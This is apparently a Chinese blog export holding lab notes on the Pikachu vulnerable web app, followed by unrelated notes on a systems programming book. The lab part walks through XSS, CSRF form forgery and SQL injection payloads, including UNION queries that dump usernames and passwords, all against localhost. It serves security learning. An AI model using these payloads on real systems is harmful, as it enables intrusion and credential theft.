<li>发现输入会直接插入到 JavaScript 中，所以 <code>&#39;&lt;/script&gt;</code> 闭合前面的 <code>&lt;script&gt;</code>，然后就可以写入 XSS 了</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210609234552759.png" alt="image-20210609234552759" style="zoom:80%;"></p>
<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3 CSRF"></a>3 CSRF</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p><a href="https://www.cnblogs.com/chenyablog/p/12108261.html">XSS与CSRF的区别 - 抖音2020 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式 - hyddd - 博客园 (cnblogs.com)</a></p>
<ul>
<li>CSRF（跨站请求伪造）与 XSS 的区别：<ul>
<li>CSRF 需要用户先登录网站A，获取 cookie。XSS 不需要登录</li>
<li>CSRF 是利用网站A本身的漏洞，去请求网站A的api。XSS 是向网站 A 注入 JS代码，然后执行 JS 里的代码，篡改网站A的内容。</li>
</ul>
</li>
</ul>
<p>总的来说就是：<strong>攻击者盗用用户的身份，假装用户发起恶意请求</strong></p>
<h3 id="3-1-CSRF-get-login"><a href="#3-1-CSRF-get-login" class="headerlink" title="3.1 CSRF(get) login"></a>3.1 CSRF(get) login</h3><ul>
<li>输入 lili/123456 点击登录并截获请求</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrfget/csrf_get_login.php?username=lili&amp;password=123456&amp;submit=Login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_login.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>登陆后信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611104359920.png" alt="image-20210611104359920" style="zoom:80%;"></p>
<ul>
<li>修改个人信息并抓包（修改手机号为 123）</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=123&amp;add=&amp;email=&amp;submit=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>这时，只要 lili 不退出登录，且点击链接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=0000&amp;add=wakanda&amp;email=hh@hh.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>就可以成功修改信息</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210611104932283.png" alt="image-20210611104932283" style="zoom:80%;"></p>
<h3 id="3-2-CSRF-post-login"><a href="#3-2-CSRF-post-login" class="headerlink" title="3.2 CSRF(post) login"></a>3.2 CSRF(post) login</h3><p><a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">参考</a></p>
<ul>
<li>登录 lili/123456，修改地址并抓包</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8081</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=if4hcn3lljacuqfjpg55llim4g</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="dts">sex=<span class="variable">&amp;phonenum</span>=<span class="variable">&amp;add</span>=whitep<span class="variable">&amp;email</span>=<span class="variable">&amp;submit</span>=submit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>构造表单提交 POST 请求。参考 <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">https://blog.csdn.net/weixin_44940180/article/details/107140456</a> </li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       	 <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将此 HTML 文件放到 <code>..\xampp\htdocs</code> 目录，在不退出 lili 账户的情况下，访问 <code>http://localhost:8081/csrf_post.html</code> </li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611113033794.png" alt="image-20210611113033794" style="zoom:80%;"></p>
<ul>
<li>点击按钮，信息被成功修改</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210611113054183.png" alt="image-20210611113054183" style="zoom:80%;"></p>
<h3 id="3-3-CSRF-Token-login"><a href="#3-3-CSRF-Token-login" class="headerlink" title="3.3 CSRF Token login"></a>3.3 CSRF Token login</h3><ul>
<li>首先登录 lili/123456，然后修改个人信息，用 BP 截获</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615225321492.png" alt="image-20210615225321492" style="zoom:80%;"></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=0&amp;phonenum=0&amp;add=0&amp;email=0&amp;token=7161660c8beacb171d715542422&amp;submit=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrftoken/token_get_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lfobrlou9i3bel3q9bbsbkvmd9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
<ul>
<li>这里与上文 CSRF(get) login 区别在于，这里是带 token 的，由于 token 是随机的，所以这里我们无法和上文一样构造 URL 让用户点击完成信息修改了。</li>
</ul>
<h2 id="4-SQL-注入"><a href="#4-SQL-注入" class="headerlink" title="4 SQL 注入"></a>4 SQL 注入</h2><h3 id="先验知识-3"><a href="#先验知识-3" class="headerlink" title="先验知识"></a>先验知识</h3><h4 id="形成的原因"><a href="#形成的原因" class="headerlink" title="形成的原因"></a>形成的原因</h4><p>前端数据传到后台处理时，未做严格过滤，导致传入的数据拼接到 SQL 语句后，被执行</p>
<h4 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h4><ul>
<li>UNION 注入<ul>
<li>方法：使用 UNION 语句把数据展示到页面</li>
</ul>
</li>
<li>报错注入<ul>
<li>方法：利用 MySQL 执行后的报错信息</li>
</ul>
</li>
<li>布尔盲注<ul>
<li>方法：看不到直接的数据，但是可以通过注入，看页面是否有变化来推测出数据。</li>
<li>案例：比如在参数后添加类似 <code>and 1=1</code> 这种，如果页面正常返回，说明 <code>and</code> 是成功执行的，那这个参数就存在 SQL 注入漏洞</li>
</ul>
</li>
<li>时间盲注<ul>
<li>方法：通过 sleep() 函数，利用 IF 函数或 AND OR 的短路特性和执行时间判断 SQL 攻击的结果</li>
<li>案例：<code>id=&#39;1&#39; or sleep(1);</code></li>
</ul>
</li>
</ul>
<h4 id="如何避免-1"><a href="#如何避免-1" class="headerlink" title="如何避免"></a>如何避免</h4><ul>
<li>使用预编译语句，绑定变量</li>
<li>检查数据类型（比如邮箱，日期等按严格的格式输入）</li>
<li>使用安全的编码函数（比如 OWASP ESAPI 中实现的encodeForSQL）</li>
</ul>
<h3 id="4-1-数字型注入"><a href="#4-1-数字型注入" class="headerlink" title="4.1 数字型注入"></a>4.1 数字型注入</h3><ul>
<li>选择任一数字，点击查询，发现 URL 并未出现对应的参数，所以应该是通过 POST 传参</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615230701375.png" alt="image-20210615230701375" style="zoom:80%;"></p>
<ul>
<li>用 BurpSuite 截获数据包</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pikachu/vul/sqli/sqli_id.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8081</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/sqli/sqli_id.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=94ocsnqcobv4btt7s7mv638b7i</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">id</span>=<span class="number">1</span>&amp;submit=%E<span class="number">6</span>%<span class="number">9</span>F%A<span class="number">5</span>%E<span class="number">8</span>%AF%A<span class="number">2</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>CTRL + R</code> 发送到 Repeater 发送，得到响应</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615230926001.png" alt="image-20210615230926001"></p>
<ul>
<li>改参数 <code>id=2</code> 重发一次，结果为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231018613.png" alt="image-20210615231018613"></p>
<ul>
<li><code>id=2-1</code> 重发，结果为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231344694.png" alt="image-20210615231344694"></p>
<ul>
<li>所以，是进行数值运算的，因此存在数字型注入</li>
<li>通过联合查询，查询数据库所有表名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210615231929918.png" alt="image-20210615231929918"></p>
<ul>
<li>查询 <code>users</code> 对应字段名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210615232221004.png" alt="image-20210615232221004"></p>
<h3 id="4-2-字符型注入"><a href="#4-2-字符型注入" class="headerlink" title="4.2 字符型注入"></a>4.2 字符型注入</h3><p><img src="/2021/06/07/pikachuRecord/image-20210627202218102.png" alt="image-20210627202218102"></p>
<ul>
<li>输入 <code>1&#39;</code> 报错</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
<ul>
<li>猜测查询语句为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;输入的用户名&#x27;;</span><br></pre></td></tr></table></figure>
<ul>
<li>所以需要先闭合前面的单引号，然后注释后面的单引号，输入以下内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627202628179.png" alt="image-20210627202628179"></p>
<p><a href="https://blog.csdn.net/weixin_41607190/article/details/82818804">原理参考</a></p>
<hr>
<h4 id="关于-or-1-1-的解释"><a href="#关于-or-1-1-的解释" class="headerlink" title="关于 or 1=1 的解释"></a>关于 <code>or 1=1</code> 的解释</h4><ul>
<li>如上述输入后，原本的查询语句就会变成</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名 WHERE username=&#x27;1&#x27; or 1=1#&#x27;;</span><br></pre></td></tr></table></figure>
<ul>
<li>这条语句条件判断会被后面的 <code>or 1=1</code> 影响，因为一直为真，所以任意 username 都会被查询    </li>
</ul>
<hr>
<h3 id="4-3-搜索型注入"><a href="#4-3-搜索型注入" class="headerlink" title="4.3 搜索型注入"></a>4.3 搜索型注入</h3><ul>
<li>只要输入用户名的一部分，就可以找到该用户并输出其信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210627203853344.png" alt="image-20210627203853344" style="zoom:80%;"></p>
<ul>
<li>所以可以想到 MYSQL 中 <a href="https://www.yuque.com/victorinfo/mysqlnote/ch08">用通配符过滤</a> ，也即使用 <code>%</code> 来表示任意字符出现任意次数，所以查询语句的后半段大致应该是 <code>username = &#39;%用户名的部分字符%&#39;</code> </li>
<li>因此，与上一例子同理，可以先输入任意字符然后闭合前面的单引号，并注释后面的单引号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627204356615.png" alt="image-20210627204356615" style="zoom:80%;"></p>
<h3 id="4-4-xx型注入"><a href="#4-4-xx型注入" class="headerlink" title="4.4 xx型注入"></a>4.4 xx型注入</h3><ul>
<li>看一下源码 <code>\xampp\htdocs\pikachu\vul\sqli</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>所以需要闭合前面的小括号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) or 1=1#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627205214188.png" alt="image-20210627205214188" style="zoom:80%;"></p>
<h3 id="拓展1-联合查询"><a href="#拓展1-联合查询" class="headerlink" title="拓展1 联合查询"></a>拓展1 联合查询</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=26&amp;spm_id_from=pageDriver">参考</a></p>
<h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><h5 id="如何查询字段数？"><a href="#如何查询字段数？" class="headerlink" title="如何查询字段数？"></a>如何查询字段数？</h5><ul>
<li>利用 <code>order by 1</code> 测试，以字符型注入为例，可以输入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure>
<p>返回结果均为</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210220009.png" alt="image-20210627210220009" style="zoom:80%;"></p>
<ul>
<li>当输入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
<p>报错</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210307201.png" alt="image-20210627210307201"></p>
<ul>
<li><p>因此可以确定有两个字段</p>
</li>
<li><p>可以通过 UNION 查询，获取数据库名 <code>database()</code>，版本 <code>version()</code> ，用户 <code>user()</code> 。当然如果只需要查询其中某个信息，可以用任意数值代替其他字段，如</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database(),2#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627210627812.png" alt="image-20210627210627812" style="zoom:80%;"></p>
<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><h5 id="a-获取表名-table-schema"><a href="#a-获取表名-table-schema" class="headerlink" title="a. 获取表名 table_schema"></a>a. 获取表名 table_schema</h5><ul>
<li>根据上文，我们已经可以知道数据库名称为 pikachu ，可以构造查询语句，查询 table_schema</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,table_name from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212118693.png" alt="image-20210627212118693" style="zoom:80%;"></p>
<h5 id="b-获取字段名-table-name"><a href="#b-获取字段名-table-name" class="headerlink" title="b. 获取字段名 table_name"></a>b. 获取字段名 table_name</h5><ul>
<li>由上文可知，有一个表为 user，所以里面极可能存放用户名及密码等重要信息</li>
<li>同理可以构造查询语句，查询表 users 中的字段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212426636.png" alt="image-20210627212426636" style="zoom:80%;"></p>
<h5 id="c-获取内容"><a href="#c-获取内容" class="headerlink" title="c. 获取内容"></a>c. 获取内容</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select username,password from users#</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210627212713423.png" alt="image-20210627212713423" style="zoom:80%;"></p>
<h3 id="拓展2-报错"><a href="#拓展2-报错" class="headerlink" title="拓展2 报错"></a>拓展2 报错</h3><p><a href="https://www.bilibili.com/video/BV1Y7411f7ic?p=28">p28</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pikachu</tag>
        <tag>漏洞练习</tag>
      </tags>
  </entry>
  <entry>
    <title>程序员的自我修养</title>
    <url>/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
    <content><![CDATA[<h2 id="第一部分-简介"><a href="#第一部分-简介" class="headerlink" title="第一部分 简介"></a>第一部分 简介</h2><h2 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h2><h3 id="硬件结构相关"><a href="#硬件结构相关" class="headerlink" title="硬件结构相关"></a>硬件结构相关</h3><ul>
<li><strong>计算机的核心：</strong> CPU，内存，I/O控制芯片</li>
<li><strong>北桥</strong>芯片 （PCI Bridge） 协调高速设备 连接CPU，内存，PCI总线<br><strong>南桥</strong>芯片 （ISA Bridge） 专门处理低速设备，汇总后连接到北桥</li>
</ul>
<h3 id="SMP与多核"><a href="#SMP与多核" class="headerlink" title="SMP与多核"></a>SMP与多核</h3><ul>
<li><strong>对称多处理器</strong>（SMP，Symmetrical Mutil-Processing）： 每个CPU在系统中的地位和功能一样，是相互对称的。理想情况下，速度的提高与CPU数量成正比，但实际上不能。因为不是所有的程序都能分解成若干个完全不相关的子问题。</li>
<li><strong>多核处理器</strong> 实际上就是SMP的简化版</li>
</ul>
<h3 id="计算机软件体系结构"><a href="#计算机软件体系结构" class="headerlink" title="计算机软件体系结构"></a>计算机软件体系结构</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932769-448f5299-a31f-4b78-9012-f5f722765353.png" alt><br>接口的上层：使用者<br>接口的下层：提供者</p>
<h3 id="操作系统的功能"><a href="#操作系统的功能" class="headerlink" title="操作系统的功能"></a>操作系统的功能</h3><p>在CSAPP中也有提到，这里更加简练</p>
<ol>
<li>提供抽象的接口</li>
<li>管理硬件资源</li>
</ol>
<h3 id="虚拟地址空间"><a href="#虚拟地址空间" class="headerlink" title="虚拟地址空间"></a>虚拟地址空间</h3><p>简单的内存分配策略存在问题：</p>
<ol>
<li>地址空间不隔离</li>
<li>内存使用效率低</li>
<li>程序运行的地址不确定</li>
</ol>
<p>所以用一种间接的地址访问方法：虚拟地址<br><strong>目的：</strong> 保证程序能访问的物理内存区域与另外的程序不重叠（也即 地址空间隔离）</p>
<h4 id="原始方法：分段"><a href="#原始方法：分段" class="headerlink" title="原始方法：分段"></a>原始方法：分段</h4><p>最开始采用<strong>分段</strong>的方法： 将一段程序所需的内存空间大小的虚拟空间映射到某个地址空间。<br><strong>优点：</strong> 隔离地址空间+确定程序运行的地址<br><strong>缺点：</strong> 没解决内存使用效率低的问题</p>
<h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><p>方法：将地址空间分为固定大小的页（页大小由操作系统决定）<br>包括：<strong>虚拟页</strong>（VP），<strong>物理页</strong>（PP），<strong>磁盘页</strong>（DP）<br>可以看到下图中，虚拟空间有些页被映射到同一个物理页，这样就可以实现<strong>内存共享</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932881-09697135-4f9d-4ac0-babb-4d0fdec20ef4.png" alt><br><strong>页映射：</strong> 采用<strong>MMU</strong> （Memory Management Unit）进行页映射。页映射模式下，CPU发出的是虚拟地址，经过MMU转换后变成物理地址，一般MMU都集成在CPU内部了，不会以独立的部件存在<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933139-68ed5853-741c-4c0e-b4c7-e5fbcf3f0eeb.png" alt></p>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>组成：</strong> 线程=线程ID+当前指令指针PC+寄存器集合+堆栈<br>进程内的各个线程之间共享程序的内存空间和一些进程级的资源<br><strong>线程的访问权限</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933282-19a1d5b5-cd8e-43f8-b134-7d8000840956.png" alt><br>线程的私有存储空间包括：栈、线程局部存储、寄存器<br><strong>I/O密集型线程：</strong> 频繁等待<br><strong>CPU密集型：</strong> 很少等待</p>
<hr>
<p><strong>抢占</strong>的概念：线程在用尽时间片之后会被强制剥夺继续执行的权利，进入就绪状态，这个过程就是抢占。即之后执行的别的线程抢占了当前线程<br><strong>可抢占线程：</strong> 用尽时间片后被剥夺权利<br><strong>不可抢占线程：</strong> 线程必须手动发出放弃执行的命令或者试图等待某事件，才能让其他线程得到执行</p>
<hr>
